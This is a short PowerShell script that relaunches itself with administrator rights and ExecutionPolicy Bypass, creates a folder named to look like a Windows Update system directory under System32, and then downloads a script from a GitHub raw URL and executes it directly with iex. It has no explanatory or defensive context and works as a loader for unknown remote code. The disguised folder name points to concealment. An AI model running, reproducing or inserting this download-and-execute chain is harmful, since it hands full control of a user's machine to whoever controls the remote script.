# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
   

    Start-Process powershell `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
        -Verb RunAs

    exit
}


$path = "C:\Windows\System32\WindowsUpdate"

if (!(Test-Path $path)) {
    New-Item -ItemType Directory -Path $path -Force
}
powershell -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/no123ex/tes/refs/heads/main/addex.ps1-UseBasicParsing | iex"
